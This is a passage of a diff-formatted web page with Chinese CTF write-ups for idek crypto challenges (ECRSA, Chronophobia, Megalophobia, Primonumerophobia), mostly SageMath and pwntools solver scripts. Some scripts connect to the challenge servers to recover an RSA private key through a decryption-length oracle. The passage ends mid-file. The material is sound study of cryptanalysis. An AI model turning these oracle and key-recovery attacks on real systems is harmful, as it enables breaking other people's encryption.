+    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">32</span> + xor(block, mask)
+    res = oracle(payload)
+    <span class="hljs-keyword">return</span> xor(res[<span class="hljs-number">0</span>], res[<span class="hljs-number">1</span>])
+
+<span class="hljs-comment"># rand, b1, b2, b3, pad</span>
+<span class="hljs-comment"># b0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)</span>
+<span class="hljs-comment"># b0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))</span>
+io.recvuntil(<span class="hljs-string">b&#x27;flag = &#x27;</span>)
+flag = <span class="hljs-built_in">bytes</span>.fromhex(io.recvline().strip().decode())
+flag = [flag[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">16</span>)][::-<span class="hljs-number">1</span>]
+t1 = [flag[<span class="hljs-number">0</span>]]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span>):
+    t1 += [enc(xor(flag[i+<span class="hljs-number">1</span>], t1[-<span class="hljs-number">1</span>]))]
+t1 = t1[:<span class="hljs-number">1</span>] + t1[<span class="hljs-number">1</span>:][::-<span class="hljs-number">1</span>]
+t2 = [flag[<span class="hljs-number">0</span>]]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span>):
+    t2 += [dec(xor(t1[i+<span class="hljs-number">1</span>], t2[-<span class="hljs-number">1</span>]))]
+flag = <span class="hljs-string">b&#x27;&#x27;</span>.join(t2)
+<span class="hljs-built_in">print</span>(flag)
+<span class="hljs-comment"># flag{wh0_3v3n_c0m3s_up_w1th_r1d1cul0us_sch3m3s_l1k3_th1s__0h_w41t__1_d0}</span></code></pre><h3 id="ecrsa"><a class="header-link" href="#ecrsa"></a>ECRSA:</h3>
+<p>先将椭圆曲线的加法在有理数域下进行计算得到3T的坐标值，而有理数域下的除法相当于模下乘逆元，因此3T的两个坐标值可以得到模n下的两个等式，然后再根据3T在该曲线上，得到另一个等式，联立这三个等式，发现第三个等式为一个关于a的线性方程，在有理数域下解得a的值，代入前两式，然后对两式的计算结果的分子求gcd，即可得到n的值；得到n的值后，因为e,d都已知，故可以分解n，分别在GF(p)和GF(q)上求得ECC的阶，将两阶相乘得到Zmod(n)下的阶，然后解密即可得到flag。</p>
+<pre class="hljs"><code><span class="hljs-comment">#sage</span>
+<span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">P, Q</span>):</span>
+    x0, y0 = P
+    x1, y1 = Q
+    <span class="hljs-keyword">if</span> P == Q:
+        lmd = (<span class="hljs-number">3</span>*x0**<span class="hljs-number">2</span>+a)/(<span class="hljs-number">2</span>*y0)
+    <span class="hljs-keyword">else</span>:
+        lmd = (y1-y0) / (x1-x0)
+    x2 = lmd**<span class="hljs-number">2</span> - x1 - x0
+    y2 = lmd*(x0 - x2) - y0
+    <span class="hljs-keyword">return</span> x2, y2
+R.&lt;a&gt; = PolynomialRing(ZZ)
+P = (ZZ(<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;ECRSA offers added security by elliptic entropy.&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)), <span class="hljs-number">2</span>)
+P2 = add(P, P)
+P3 = add(P, P2)
+f = <span class="hljs-built_in">str</span>(P3[<span class="hljs-number">0</span>]).split(<span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-built_in">str</span>(P3[<span class="hljs-number">1</span>]).split(<span class="hljs-string">&#x27;/&#x27;</span>)
+f = [R(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f]
+
+Te = (<span class="hljs-number">79615329406682121028641446306520032869660130854153788352536429332441749473394735222836513266191300847548366008281109415002581029448905418880962931523411475044527689429201653146200630804486870653795937020571749192405439450656659472253086567149309166068212312829071678837253421625687772396105149376211148834937</span>,<span class="hljs-number">114576105009077728778286635566905404081211824310970349548035698466418670695753458926421098950418414701335730404414509232776047250916535638430446206810902182305851611221604003509735478943147034397832291215478617613443375140890349118302843641726392253137668650493281241262406250679891685430326869028996183320982</span>)
+Me = (<span class="hljs-number">115076663389968253954821343472300155800654332223208277786605760890770425514748910251950393842983935903563187546008731344369976804796963863865102277460894378910744413097852034635455187460730497479244094103353376650220792908529826147612199680141743585684118885745149209575053969106545841997245139943766220688789</span>,<span class="hljs-number">74232642959425795109854140949498935461683632963630260034964643066394703345139733396470958836932831941672213466233486926122670098721687149917605871805886006479766670309639660332339984667770417687192717160061980507220617662938436637445370463397769213554349920956877041619061811087875024276435043752581073552318</span>)
+
+f0 = f[<span class="hljs-number">0</span>] - f[<span class="hljs-number">1</span>] * Te[<span class="hljs-number">0</span>]
+f1 = f[<span class="hljs-number">2</span>] - f[<span class="hljs-number">3</span>] * Te[<span class="hljs-number">1</span>]
+f2 = Te[<span class="hljs-number">0</span>]**<span class="hljs-number">3</span> + a*Te[<span class="hljs-number">0</span>] - Te[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>-(Me[<span class="hljs-number">0</span>]**<span class="hljs-number">3</span> + a*Me[<span class="hljs-number">0</span>] - Me[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)
+<span class="hljs-built_in">print</span>(f2)
+a0=-<span class="hljs-number">1019268867267849424908357367733931941383149668286864008861662442680604058151693707791547011105186550019092586871229367602480951232469366295595128740384313397226761125592114592001298261062965213964211518794413291961567779146411551935492149763883963272734637871273976142997464735273842094527385872407012350495753298964870092922939941557312324244091706263803037684216879489854927518197495340486943316099448245524778860809444971443935794707968413693163036741320366137839392605690457251072731869232133843078162397057596189198269026990658078279998575424676768178510688889622050681034958153231556029864713685758814785896436116013310016899574654253785383489362957328536913784532588181648611237704933470028564747329012603054002623952267126949886810588734363614455501359064859547724824540676184962858003962647114120432607459636061800842389469449254464940592103479283633803337327710969181902456604551946745128222513462440426982787689316</span>/<span class="hljs-number">35461333983286132926179897165780122930994201369054489434069331558328676041354175029113880576792635056014821537727621929367395775348058444984139345937482903866216723668650381489254556656243626825448157082781627457815353457873166675359113112992434419615906572916077530737800547480858069601139990567555071853852</span>
+<span class="hljs-comment">#assert Zmod(n)(a0)==a1</span>
+b1=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(f0(a0)).split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">0</span>])
+b2=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(f1(a0)).split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">0</span>])
+
+n=ZZ(gcd(b1,b2))
+d=<span class="hljs-number">99193023581616109152177764300040037859521925088272985981669959946817746109531909713425474710564402873765914926441545005839662821744603138460681680285655317684469203777533871394260260583839662628325884473084768835902143240687542429953968760669321064892423877370896609497584167478711224462305776836476437268587</span>
+a=Zmod(n)(a0)
+b=(Te[<span class="hljs-number">1</span>]^<span class="hljs-number">2</span>-(Te[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+a*Te[<span class="hljs-number">0</span>]))%n
+
+<span class="hljs-built_in">print</span>(n)
+p=<span class="hljs-number">12290271213546041363951851773787980582602437964255454723585180242187866091592878156042540239644364150942318226563612517243038643884916020981628688069132457</span>
+q=<span class="hljs-number">12106285759457603837646209698473787447139576157605716627376889077738609086595516271990595704705464336024969899141833853372028724555298162959385807206566981</span>
+E1=EllipticCurve(GF(p),[a,b])
+E2=EllipticCurve(GF(q),[a,b])
+E=EllipticCurve(Zmod(n),[a,b])
+<span class="hljs-comment">#order=E1.order()*E2.order()</span>
+order=<span class="hljs-number">148789535372424163728266646450060056789282887632409478972504939920226619164296671910830162422173521086104260442096339694304886999126003562791358712412416317442287195786906697615489065379945573862193455179868067475036156124279466870451072060581891741234837916854904063588317305400955406105882208744056825746850</span>
+<span class="hljs-built_in">print</span>(order)
+dd=invert(<span class="hljs-number">3</span>,order)
+<span class="hljs-built_in">print</span>(long_to_bytes(ZZ((E(Me)*dd)[<span class="hljs-number">0</span>])))
+<span class="hljs-string">&#x27;&#x27;&#x27;
+b&quot;It is UNBREAKABLE, I tell you!! I&#x27;ll even bet a flag on it, here it is: idek{Sh3_s3ll5_5n4k3_01l_0n_7h3_5e4_5h0r3}&quot;
+&#x27;&#x27;&#x27;</span></code></pre><h3 id="chronophobia："><a class="header-link" href="#chronophobia："></a>Chronophobia：</h3>
+<p>由于不知道n的分解，我们无法计算出phi，也就无法快速计算出 </p>
+<p>$$2^{2^d}  mod  n$$ </p>
+<p>的值，但是题目提供了一个oracle，可以帮我们计算出给定token的计算结果的高200个十进制位，而低位大概是108个十进制位，于是我们可以通过以下方法求出给定token的低位：</p>
+<p>$$c_1\equiv token^r mod n$$</p>
+<p>$$c_2=(token^2)^r mod n$$</p>
+<p>$$c_1^2-c_2\equiv 0 mod n$$</p>
+<p>$$(c_{1h}+c_{1l})^2-(c_{2h}+c_{2l})\equiv 0 mod n$$</p>
+<p>于是我们对两个低位使用二元coppersmith，就可以计算出结果，进而可以恢复整个结果。
+值得注意的地方是，二元coppersmith的参数很重要，一开始我直接用的默认m和d，发现结果虽然会满足 </p>
+<p>$$c_1^2-c_2\equiv 0 mod n$$ </p>
+<p>，但是却并不是我们所需要的解，将参数设置为m=4,d=4，就可以把我们需要的结果copper出来。</p>
+<pre class="hljs"><code><span class="hljs-comment">#sage</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> itertools
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">2</span>, d=<span class="hljs-literal">None</span></span>):</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:
+        d = f.degree()
+
+    R = f.base_ring()
+    N = R.cardinality()
+
+    f /= f.coefficients().pop(<span class="hljs-number">0</span>)
+    f = f.change_ring(ZZ)
+
+    G = <span class="hljs-type">Sequence</span>([], f.parent())
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m+<span class="hljs-number">1</span>):
+        base = N^(m-i) * f^i
+        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):
+            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))
+            G.append(g)
+
+    B, monomials = G.coefficient_matrix()
+    monomials = vector(monomials)
+
+    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]
+    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):
+        B.rescale_col(i, factor)
+
+    B = B.dense_matrix().LLL()
+
+    B = B.change_ring(QQ)
+    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):
+        B.rescale_col(i, <span class="hljs-number">1</span>/factor)
+
+    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))
+    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B*monomials):
+        H.append(h)
+        I = H.ideal()
+        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:
+            H.pop()
+        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:
+            roots = []
+            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):
+                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())
+                roots.append(root)
+            <span class="hljs-keyword">return</span> roots
+
+    <span class="hljs-keyword">return</span> []
+
+context.log_level=<span class="hljs-string">&quot;debug&quot;</span>
+<span class="hljs-comment">#s=process([&#x27;python3&#x27;,&#x27;oracle.py&#x27;])</span>
+s=remote(<span class="hljs-string">&quot;chronophobia.chal.idek.team&quot;</span>,<span class="hljs-number">1337</span>)
+s.recvuntil(<span class="hljs-string">b&#x27;Here is your random token: &#x27;</span>)
+t=<span class="hljs-built_in">int</span>(s.recvline()[:-<span class="hljs-number">1</span>].decode())
+s.recvuntil(<span class="hljs-string">b&#x27;The public modulus is: &#x27;</span>)
+n=<span class="hljs-built_in">int</span>(s.recvline()[:-<span class="hljs-number">1</span>].decode())
+s.recvuntil(<span class="hljs-string">b&#x27;Do 2^&#x27;</span>)
+d=<span class="hljs-built_in">int</span>(s.recvline()[:<span class="hljs-number">3</span>].decode())
+fac=[t,<span class="hljs-built_in">pow</span>(t,<span class="hljs-number">2</span>,n)]
+H=[]
+B=[]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
+    s.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>)
+    s.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)
+    s.recvuntil(<span class="hljs-string">b&#x27;Tell me the token. &#x27;</span>)
+    s.sendline(<span class="hljs-built_in">str</span>(fac[i]).encode())
+    s.recvuntil(<span class="hljs-string">b&#x27;What is your calculation? &#x27;</span>)
+    s.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)
+    s.recvuntil(<span class="hljs-string">b&#x27;Nope, the ans is &#x27;</span>)
+    tmp=<span class="hljs-built_in">int</span>(s.recvuntil(<span class="hljs-string">b&#x27;... (&#x27;</span>)[:-<span class="hljs-number">5</span>].decode())
+    bits=<span class="hljs-built_in">int</span>(s.recvline()[:<span class="hljs-number">3</span>].decode())
+    H.append(tmp)
+    B.append(bits)
+
+
+P.&lt;x,y&gt;=PolynomialRing(Zmod(n))
+
+
+f1=H[<span class="hljs-number">0</span>]*<span class="hljs-number">10</span>**B[<span class="hljs-number">0</span>]+x
+f2=H[<span class="hljs-number">1</span>]*<span class="hljs-number">10</span>**B[<span class="hljs-number">1</span>]+y
+f=f1^<span class="hljs-number">2</span>-f2
+roots=small_roots(f,(<span class="hljs-number">10</span>**B[<span class="hljs-number">0</span>],<span class="hljs-number">10</span>**B[<span class="hljs-number">1</span>]),m=<span class="hljs-number">4</span>,d=<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]
+roots=(roots[<span class="hljs-number">0</span>],roots[<span class="hljs-number">1</span>])
+c1=roots[<span class="hljs-number">0</span>]+H[<span class="hljs-number">0</span>]*<span class="hljs-number">10</span>**B[<span class="hljs-number">0</span>]
+c2=roots[<span class="hljs-number">1</span>]+H[<span class="hljs-number">1</span>]*<span class="hljs-number">10</span>**B[<span class="hljs-number">1</span>]
+<span class="hljs-keyword">assert</span> (c1^<span class="hljs-number">2</span>-c2)%n==<span class="hljs-number">0</span>
+
+s.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>)
+s.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)
+s.recvuntil(<span class="hljs-string">b&#x27;Tell me the token. &#x27;</span>)
+s.sendline(<span class="hljs-built_in">str</span>(t).encode())
+s.recvuntil(<span class="hljs-string">b&#x27;What is your calculation? &#x27;</span>)
+s.sendline(<span class="hljs-built_in">str</span>(c1).encode())
+s.recvline()
+
+s.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>)
+s.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)
+s.recvuntil(<span class="hljs-string">b&#x27;Give me the ticket. &#x27;</span>)
+s.sendline(<span class="hljs-built_in">str</span>(c1).encode())
+s.recvline()
+
+s.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>)
+s.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)
+s.recvline()
+
+<span class="hljs-comment">#idek{St@rburst_str3@m!!!}</span></code></pre><h3 id="megalophobia"><a class="header-link" href="#megalophobia"></a>Megalophobia:</h3>
+<p>题目模拟了把RSA私钥加密发送给用户再由用户上传的过程。这个过程中，虽然不能直接修改密钥为特定内容，但可以对d,u进行随机修改。同时服务端使用了CRT-RSA的方式进行解密并可以返回解密后的明文长度是否为128。考虑将u修改，则当明文小于q时可以正常解密，否则解密结果为随机值，有很大概率长度为128。这样就可以二分得到q从而恢复私钥。</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># context.log_level = &quot;debug&quot;</span>
+io = connect(<span class="hljs-string">&quot;megalophobia.chal.idek.team&quot;</span>, <span class="hljs-number">1337</span>)
+
+io.recvuntil(<span class="hljs-string">b&quot;::\n|    &quot;</span>)
+data = io.recvline().strip().decode()
+pub, sec = data.split(<span class="hljs-string">&quot;::&quot;</span>)
+e = <span class="hljs-number">0x10001</span>
+
+n = <span class="hljs-built_in">int</span>(pub, <span class="hljs-number">16</span>)
+sec = <span class="hljs-built_in">bytes</span>.fromhex(sec)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{n = }</span>&quot;</span>)
+<span class="hljs-built_in">print</span>(sec)
+
+u_len = <span class="hljs-number">0x40</span>
+target_u_len = <span class="hljs-number">0x39</span>
+u_len_pos = (<span class="hljs-number">2</span> + <span class="hljs-number">64</span>) * <span class="hljs-number">2</span> + <span class="hljs-number">2</span> + <span class="hljs-number">128</span> + <span class="hljs-number">1</span>
+
+sec = <span class="hljs-built_in">list</span>(sec)
+sec[u_len_pos] ^= target_u_len ^ u_len
+
+sec = <span class="hljs-built_in">bytes</span>(sec)
+
+io.recvuntil(<span class="hljs-string">b&quot;&gt; (hex)&quot;</span>)
+io.sendline(sec.<span class="hljs-built_in">hex</span>().encode())
+
+l = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">511</span>
+r = <span class="hljs-number">2</span> * l -<span class="hljs-number">1</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):
+    io.recvuntil(<span class="hljs-string">b&quot;|  &gt; &quot;</span>)
+    mid = (l+r)//<span class="hljs-number">2</span>
+    <span class="hljs-keyword">if</span> i % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(mid))
+    now = <span class="hljs-built_in">pow</span>(mid, e, n)
+    io.sendline(long_to_bytes(now).<span class="hljs-built_in">hex</span>().encode())
+    res = io.recvline()
+    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Q_Q&quot;</span> <span class="hljs-keyword">in</span> res:
+        l = mid + <span class="hljs-number">1</span>
+    <span class="hljs-keyword">else</span>:
+        r = mid 
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{n = }</span>&quot;</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{l = }</span>&quot;</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{r = }</span>&quot;</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{sec = }</span>&quot;</span>)
+io.interactive()</code></pre><h3 id="primonumerophobia"><a class="header-link" href="#primonumerophobia"></a>Primonumerophobia</h3>
+<p>这个题有一个 <code>1*47</code> 的随机变量 <code>s</code> ，<code>47*512</code> 的矩阵 $$mat_1, mat_2$$， 得到 $$s\times mat_1=p, s\times mat_2=q$$，然后把 <code>p, q</code> 当成二进制数，保证 <code>p, q</code> 都是质数，现在知道$$mat_1, mat_2, n=p\times q$$，求 <code>p, q</code>。所有运算都是在 <code>GF(2)</code> 下。
+我们可以考虑枚举 <code>p</code> 的低 24 位，由于已知 <code>n</code> ，我们可以对应计算出若干个 <code>q</code> 的低 24 位，知道 48 位信息之后可以通过异或线性基的方式把 <code>p</code> 跟 <code>q</code> 的其余位都计算出来（因为每一个 bit 对应 <code>mat</code> 的一个列向量，列向量一共 47 维，所以只需要 47 个线性无关的列向量就能得到整个空间的一组基，其余的可以通过这组基异或得到）。</p>
+<pre class="hljs"><code>d = <span class="hljs-number">47</span>
+M = Matrix(GF(<span class="hljs-number">2</span>),<span class="hljs-number">47</span>,<span class="hljs-number">47</span>)
+taps = [<span class="hljs-number">47</span>, <span class="hljs-number">43</span>, <span class="hljs-number">41</span>, <span class="hljs-number">37</span>, <span class="hljs-number">31</span>, <span class="hljs-number">29</span>, <span class="hljs-number">23</span>, <span class="hljs-number">19</span>, <span class="hljs-number">17</span>, <span class="hljs-number">13</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>]
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(d - <span class="hljs-number">1</span>):
+    M[_+<span class="hljs-number">1</span>,_] = <span class="hljs-number">1</span>
+<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> taps:
+    M[<span class="hljs-number">47</span>-_,-<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>
+
+<span class="hljs-comment"># states = vector(GF(2),) 中间有个47bits的states，恢复出来即可</span>
+times1 = <span class="hljs-number">1160</span>
+M_tmp = M**((times1-<span class="hljs-number">1</span>)*<span class="hljs-number">512</span>)
+new_mat1 = Matrix(GF(<span class="hljs-number">2</span>),d,<span class="hljs-number">512</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(d):
+        new_mat1[j,i] = M_tmp[j,<span class="hljs-number">0</span>]
+    M_tmp *= M
+
+<span class="hljs-comment"># 往后推q的关系，比如说输出是[LOG]447</span>
+times2 = <span class="hljs-number">447</span>
+M_tmp = M_tmp * M**((times2-<span class="hljs-number">1</span>)*<span class="hljs-number">512</span>)
+new_mat2 = Matrix(GF(<span class="hljs-number">2</span>),d,<span class="hljs-number">512</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(d):
+        new_mat2[j,i] = M_tmp[j, <span class="hljs-number">0</span>]
+    M_tmp *= M
+
+<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(d):
+        <span class="hljs-built_in">print</span>(new_mat1[i, j], end = <span class="hljs-string">&quot; &quot;</span>)
+    <span class="hljs-built_in">print</span>()
+
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;mat1.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:
+     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_mat1.T:
+         l = []
+         <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:
+             l.append(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(j)))
+         f.write(<span class="hljs-string">&quot; &quot;</span>.join(l)+<span class="hljs-string">&quot;\n&quot;</span>)
+
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;mat2.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:
+     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_mat2.T:
+         l = []
+         <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:
+             l.append(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(j)))
+         f.write(<span class="hljs-string">&quot; &quot;</span>.join(l)+<span class="hljs-string">&quot;\n&quot;</span>)</code></pre><pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> random
+
+n = <span class="hljs-number">78189483779073760819769596415493404181115737255987326126790953924148600157623709942134043192581448967829591214999561812461790206591977861764710056434977125005626712442593271233036617073503751799983263888626278748439349756982639988997517983470845431197233107232933125334078771472039280629203017666578936360521</span>
+
+last = []
+binn = <span class="hljs-built_in">bin</span>(n)[<span class="hljs-number">2</span>:]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):
+    x = binn[-(i + <span class="hljs-number">1</span>) : ]
+    last.append(<span class="hljs-built_in">int</span>(x, <span class="hljs-number">2</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">p, cur, x</span>):</span>
+
+    <span class="hljs-keyword">global</span> ans
+
+    <span class="hljs-keyword">if</span> x == <span class="hljs-number">24</span>:
+        ans.append((p[-<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(cur, <span class="hljs-number">2</span>)))
+        <span class="hljs-keyword">return</span>
+
+    _p = p[x]
+    _n = last[x]
+
+    t = <span class="hljs-string">&quot;0&quot;</span> + <span class="hljs-string">&quot;&quot;</span>.join(cur)
+    _q = <span class="hljs-built_in">int</span>(t, <span class="hljs-number">2</span>)
+    <span class="hljs-keyword">if</span> ((_p * _q) &amp; ((<span class="hljs-number">1</span> &lt;&lt; (x+<span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>)) == _n:
+        dfs(p, <span class="hljs-string">&quot;0&quot;</span> + cur, x + <span class="hljs-number">1</span>)
+
+    t = <span class="hljs-string">&quot;1&quot;</span> + <span class="hljs-string">&quot;&quot;</span>.join(cur)
+    _q = <span class="hljs-built_in">int</span>(t, <span class="hljs-number">2</span>)
+    <span class="hljs-keyword">if</span> ((_p * _q) &amp; ((<span class="hljs-number">1</span> &lt;&lt; (x+<span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>)) == _n:
+        dfs(p, <span class="hljs-string">&quot;1&quot;</span> + cur, x + <span class="hljs-number">1</span>)
+
+ans = []
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24</span>):
+    cur = <span class="hljs-string">&quot;&quot;</span>
+    p = []
+    binp = <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:]
+    binp = ((<span class="hljs-number">24</span> - <span class="hljs-built_in">len</span>(binp)) * <span class="hljs-string">&quot;0&quot;</span>) + binp
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):
+        p.append(<span class="hljs-built_in">int</span>(binp[-(j+<span class="hljs-number">1</span>) : ], <span class="hljs-number">2</span>))
+    dfs(p, cur, <span class="hljs-number">0</span>)
+
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pq.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:
+    <span class="hljs-keyword">for</span> p, q <span class="hljs-keyword">in</span> ans:
+        f.write(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-built_in">str</span>(q) + <span class="hljs-string">&quot;\n&quot;</span>)</code></pre><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;set&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cmath&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cassert&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;queue&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;numeric&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
